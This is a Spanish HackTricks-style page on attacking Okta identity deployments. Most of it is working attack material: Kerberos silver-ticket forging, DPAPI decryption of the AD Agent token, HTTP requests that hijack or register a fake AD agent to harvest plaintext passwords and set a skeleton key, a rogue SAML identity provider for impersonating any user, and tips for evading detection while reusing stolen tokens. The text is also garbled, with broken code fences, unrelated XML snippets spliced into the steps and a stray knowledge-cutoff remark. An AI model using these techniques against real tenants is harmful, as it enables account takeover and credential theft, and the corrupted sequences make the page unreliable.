# Seguridad en Okta

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información Básica

Okta, Inc. es una **empresa de gestión de identidad y acceso** que proporciona software en la nube para ayudar a las empresas a **gestionar y asegurar la autenticación de usuarios en aplicaciones modernas**, y para que los desarrolladores integren controles de identidad en aplicaciones, servicios web de sitios web y dispositivos.

Su servicio principal, llamado Okta Identity Cloud, ofrece productos que incluyen inicio de sesión único (SSO), autenticación multifactor (MFA), gestión del ciclo de vida, directorio universal, gestión de acceso a API y más. Esto ayuda a las empresas a proteger sus datos sensibles y también a simplificar el acceso de los usuarios, haciendo que las aplicaciones y servicios sean más accesibles y fáciles de usar para empleados o clientes.

Los servicios de Okta son ampliamente utilizados en contextos empresariales, así como por empresas más pequeñas y desarrolladores. Juega un papel crucial en la habilitación de las empresas para adoptar y gestionar de manera segura las tecnologías en la nube. Hasta mi última actualización de conocimientos en septiembre de 2021, Okta sigue siendo un actor importante en la industria de Gestión de Identidad y Acceso (IAM).

{% hint style="danger" %}
El principal objetivo de Okta es configurar el acceso a diferentes usuarios y grupos a aplicaciones externas. Si logras **comprometer los privilegios de administrador en un entorno de Okta**, con alta probabilidad podrás **comprometer todas las otras plataformas que la empresa está utilizando**.
{% endhint %}

{% hint style="success" %}
Para realizar una revisión de seguridad de un entorno Okta, debes solicitar **acceso de solo lectura de administrador**.
{% endhint %}

### Resumen

Hay **usuarios** (que pueden estar **almacenados en Okta**, registrados desde **Proveedores de Identidad** configurados o autenticados a través de **Active Directory** o LDAP).\
Estos usuarios pueden estar dentro de **grupos**.\
También hay **autenticadores**: diferentes opciones para autenticarse como contraseña, y varios 2FA como WebAuthn, correo electrónico, teléfono, okta verify (pueden estar habilitados o deshabilitados)...

Luego, hay **aplicaciones** sincronizadas con Okta. Cada aplicación tendrá algún **mapeo con Okta** para compartir información (como direcciones de correo electrónico, nombres de pila...). Además, cada aplicación debe estar dentro de una **Política de Autenticación**, que indica los **autenticadores necesarios** para que un usuario **acceda** a la aplicación.

{% hint style="danger" %}
El rol más poderoso es **Super Administrador**.

Si un atacante compromete Okta con acceso de Administrador, todas las **aplicaciones que confían en Okta** serán con alta probabilidad **comprometidas**.
{% endhint %}

## Ataques

### Localizar el Portal de Okta

Normalmente, el portal de una empresa estará ubicado en **companyname.okta.com**. Si no, intenta **variaciones simples** de **companyname.** Si no lo encuentras, también es posible que la organización tenga un registro **CNAME** como **`okta.companyname.com`** apuntando al **portal de Okta**.

### Iniciar sesión en Okta vía Kerberos

(Ataque copiado [**de aquí**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si existe un dominio como **`companyname.kerberos.okta.com`**, entonces kerberos está configurado dentro de la empresa para acceder a Okta. Esto es muy interesante ya que normalmente los usuarios de Windows no necesitarán MFA para acceder a Okta.

También es posible encontrar usuarios de Kerberos configurados con acceso a Okta dentro del entorno de AD ejecutando:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Con un ticket recuperado para el usuario de AD, necesitamos inyectarlo en un host que controlemos usando Rubeus o Mimikatz:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Deberás asegurarte de que `clientname.kerberos.okta.com` esté añadido a la zona de seguridad "Intranet" en Opciones de Internet. Luego, en nuestro navegador, si accedemos a la siguiente URL, deberíamos recibir una respuesta JSON que proporciona un resultado `OK` cuando se acepta el ticket de Kerberos:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dirigiéndote al panel de control de Okta, si todo está bien, habrás iniciado sesión.

Además, si somos capaces de comprometer la cuenta de servicio de Okta que expone el SPN de delegación, podemos realizar un ataque de Silver Ticket.

Cabe señalar que, como Okta solo admite AES para la encriptación de tickets, necesitaremos asegurarnos de tener la clave AES o la contraseña en texto plano para autenticarnos:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para crear nuestro ticket para el usuario víctima `testuser`, usamos:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
```markdown
{% endcode %}

Y nuevamente, entregamos esto a Okta a través de nuestra sesión de navegador:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Secuestro del Agente AD de Okta

(Ataque copiado [**de aquí**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si accedes a un servidor que ejecuta el Agente AD de Okta. Este agente es responsable de sincronizar usuarios y grupos del dominio con Okta para la provisión, y también de responder a solicitudes de autenticación de Okta cuando los usuarios inician sesión en el portal.

Por defecto, el agente se instala en:
```
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Vamos a echar un vistazo al `OktaAgentService.exe.config`, que contiene algunos fragmentos interesantes de XML:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

El `AgentToken` codificado en Base64 es donde ponemos nuestra atención. Si abrimos `OktaAgentService.exe` en dnSpy, podemos ver cómo se descifran estos valores:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Así es... ¡el buen viejo DPAPI! El valor de `RandomEntropy` se establece en:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto significa que podemos descifrar este valor de XML codificado en Base64 utilizando:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
La clave maestra DPAPI utilizada pertenece a la cuenta de usuario que ejecuta el servicio "Okta AD Agent", por lo que necesitarás ejecutar lo anterior en el contexto de la cuenta de servicio, o capturar la clave maestra para la cuenta y descifrar:

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por ejemplo, dentro de `OktaAgentService.exe.config` tenemos dos campos XML adicionales, `APPID` y `AGENTID`. Combinados con el `AgentToken`, podemos realizar una solicitud `GET` de la siguiente manera:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Esta llamada se bloqueará hasta que un usuario se autentique en Okta (o la solicitud expire), en cuyo caso devolverá el siguiente nombre de usuario y contraseña proporcionados en texto claro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Mientras esto permite capturar credenciales, también tenemos la oportunidad de responder a este intento de autenticación si queremos hacer algo como proporcionar una llave maestra. Hacemos esto emitiendo la siguiente solicitud HTTP:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
El resultado de emitir esta solicitud es permitir la autenticación para cualquier usuario a través de Okta.

### Secuestro de AD como Administrador

(Ataque copiado [**de aquí**](https://trustedsec.com/blog/okta-for-red-teamers)).

Sabemos que podemos secuestrar un Agente de AD de Okta utilizando un Token de Agente robado, pero ¿qué pasa si hemos comprometido una cuenta privilegiada de Okta y queremos hacer esto sin un token de agente existente? Veamos cómo hacerlo.

Primero, necesitamos crear un token de API para el Agente de AD de Okta. Para iniciar el flujo de autenticación, necesitamos un Código OAuth. Para obtenerlo, comenzamos dirigiéndonos a:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
```markdown
{% endcode %}

Esto te presentará un mensaje de permiso para que aceptes:

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aceptar el mensaje presentado te redirigirá a `/oauth-response` junto con un parámetro `code`:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Necesitamos tomar este parámetro `code` y solicitar un token de API usando la solicitud POST:
```
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
La respuesta nos devuelve nuestro token de API:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
Usando este token, necesitamos asociarlo con un dominio AD activo. Hacemos esto utilizando la llamada a la API:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Esto nos devolverá la siguiente respuesta XML, donde necesitamos retener el valor del atributo `id` para más adelante
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
A continuación, realizamos una llamada a la API HTTP para nombrar nuestro conector:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="12345">
  <name>John Doe</name>
  <email>johndoe@example.com</email>
</user>
```
{% endcode %}

Esto devolverá una respuesta XML donde, nuevamente, necesitamos retener el atributo `id`:

{% code overflow="wrap" %}
```xml
<usuario id="12345">
  <nombre>John Doe</nombre>
  <correo>johndoe@example.com</correo>
</usuario>
```
{% endcode %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
Finalmente, inicializamos la conexión para permitir la recepción de datos:
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Con esto hecho, nuestro falso agente de AD está listo y procesará los intentos de autenticación como se mostró anteriormente.

Ahora, obviamente no queremos estar haciendo todo esto usando Burp, por lo que se ha creado una herramienta para soportar algunos casos de uso. Esta está disponible [aquí](https://github.com/xpn/OktaPostExToolkit).

El primer modo en el que podemos ejecutar esta herramienta es en modo `token`, que toma un valor de Token de Agente comprometido y se conectará a la API de Okta, volcando cualquier credencial que reciba:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
Ejemplos de video:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

La herramienta también permite registrar un nuevo conector de AD si tenemos credenciales administrativas disponibles para un usuario de Okta que esté utilizando:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Proveedor Falso de SAML de Okta

(Ataque copiado [**de aquí**](https://trustedsec.com/blog/okta-for-red-teamers)).

Otra técnica que ha sido muy útil durante las evaluaciones es el despliegue de un proveedor falso de SAML.

Recientemente, Okta proporcionó [una actualización de seguridad](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sobre ataques en el mundo real utilizando esta técnica, por lo que es ciertamente útil conocer esto al simular actividad en un entorno, especialmente para clientes que desean probar sus detecciones de este ataque particular.

Si tenemos acceso a una cuenta de Okta con privilegios elevados, podemos desplegar un Proveedor de Identidad externo como parte de la funcionalidad de Okta. Esto permite que proveedores externos como Entra ID completen la autenticación antes de redirigir al usuario a Okta para seleccionar aplicaciones integradas.

Pero, ¿qué pasa si controlamos el IDP? Bueno, es lógico pensar que en este caso, podemos aprobar cualquier solicitud de autenticación que queramos.

Para probar esto, necesitamos un Proveedor de Identidad personalizado para desplegar. Un IDP de SAML muy rudimentario que apoya nuestras actividades nefastas se puede encontrar [aquí](https://github.com/xpn/OktaPostExToolkit). La idea principal detrás de esta herramienta es permitirnos emitir respuestas de autenticación SAML firmadas que correspondan a cualquier usuario que queramos.

Este servidor escuchará las solicitudes HTTP entrantes en `/saml`, por lo que primero necesitamos desplegar un IDP en Okta.

Primero, seleccionamos el IDP de SAML 2.0:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al configurar el IDP, necesitamos prestar atención a algunas configuraciones. La primera es el `Name`, que es el nombre amigable que se mostrará a cualquier otro administrador de Okta.

Luego está la URL del emisor, que debe establecerse en el valor de un identificador en formato URI. Esto nuevamente puede ser cualquier cosa, pero usaremos `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

También necesitamos establecer el campo `IdP Single Sign-On URL` en la ubicación donde nuestro servidor SAML está en funcionamiento. Ahora, lo interesante es que esta URL NO necesita apuntar a nuestro servidor. Siento que vale la pena señalar esto porque podemos ser bastante creativos en la URL que ingresamos aquí y hacer el trabajo del Equipo Azul un poco más difícil. Por ejemplo, podemos establecer este campo en algo como `https://idp.google.com/saml` si queremos, y lo único que necesitamos poder hacer es capturar la solicitud SAML entrante. Aquí está lo interesante: la solicitud SAML se reenvía del lado del cliente. Con eso, quiero decir que Okta generará la `AuthRequest` de SAML y hará que nuestro navegador se redirija a `https://idp.google.com/` junto con la solicitud SAML. Esto, por supuesto, significa que podemos modificar el archivo de hosts local para apuntar `idp.google.com` a `127.0.0.1`:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
También necesitamos un certificado de firma que controlemos. Puede ser autofirmado y generado usando OpenSSL con:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Una vez más, puedes ser creativo con esto, ya que no hay requisitos específicos en torno a la autenticidad de este certificado.

Una vez generado el clave, simplemente subimos el certificado a Okta y creamos nuestro IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Finalmente, necesitamos asegurarnos de que `Match Against` esté configurado como `Okta Username or Email` y `Account Link Policy` esté configurado como `Automatic` para permitirnos autenticarnos en cuentas de Okta existentes:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Con todo guardado, necesitamos descargar los Metadatos:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Luego, para iniciar la solicitud de autenticación y emitir el `AuthRequest`, navegamos a la URL mostrada en `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Navegar a esta URL resulta en una redirección a nuestro servidor SAML interno:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Si proporcionamos una dirección de correo electrónico, descubrimos que podemos autenticarnos como cualquier usuario de Okta sin necesidad de conocer sus credenciales.

Veamos esto en acción en [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing Okta Portal con Evilgnix

En [**este post del blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) se explica cómo preparar una campaña de phishing contra un portal de Okta.

### Ataque de Suplantación de Colega

Los **atributos que cada usuario puede tener y modificar** (como el correo electrónico o el nombre) pueden configurarse en Okta. Si una **aplicación** está **confiando** en un **atributo** que el usuario puede **modificar** como ID, podrá **suplantar a otros usuarios en esa plataforma**.

Por lo tanto, si la aplicación confía en el campo **`userName`**, probablemente no podrás cambiarlo (porque normalmente no puedes cambiar ese campo), pero si confía por ejemplo en **`primaryEmail`** podrías ser capaz de **cambiarlo al correo electrónico de un colega** y suplantarlo (necesitarás tener acceso al correo electrónico y aceptar el cambio).

Ten en cuenta que esta suplantación depende de cómo cada aplicación esté configurada. Solo las que confíen en el campo que modificaste y acepten actualizaciones estarán comprometidas.\
Por lo tanto, la aplicación debería tener este campo habilitado si existe:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

También he visto otras aplicaciones que eran vulnerables pero no tenían ese campo en la configuración de Okta (al final diferentes aplicaciones están configuradas de manera diferente).

¡La mejor manera de averiguar si podrías suplantar a alguien en cada aplicación sería intentarlo!

## Evadiendo políticas de detección de comportamiento <a href="#9fde" id="9fde"></a>

A menos que se haya divulgado de antemano, probablemente no sabrás si se han implementado políticas de detección de comportamiento hasta que te encuentres con ellas. Una **forma potencial de eludir las políticas de detección de comportamiento de Okta** es simplemente **evitar el panel principal de Okta** por completo y dirigirse directamente a las aplicaciones de Okta (estas serían las aplicaciones en la captura de pantalla anterior que están oscurecidas por cajas rojas). Si estás en posesión de un token de acceso de Okta, en lugar de reutilizar el token en la página principal de inicio de sesión de Okta de tu empresa objetivo, reutilizarías el token en la URL específica de la aplicación de Okta.

Otras recomendaciones son:

* Ten cuidado al reutilizar tokens de acceso capturados desde proxies anonimizadores populares y servicios VPN.
* Al reutilizar un token de acceso, usa la misma cadena de agente de usuario utilizada por el cliente.
* Ten cuidado al reutilizar tokens de acceso capturados de diferentes usuarios desde la misma dirección IP.
* Ten cuidado al reutilizar tokens de acceso contra el panel de Okta.
* Si conoces las direcciones IP de la empresa que las víctimas estarán utilizando, considera bloquear todo el tráfico que no sea de esa IP o rango de IP.

## Fortalecimiento de Okta

Okta tiene muchas configuraciones posibles, en esta página encontrarás cómo revisarlas para que sean lo más seguras posible:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## Referencias

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
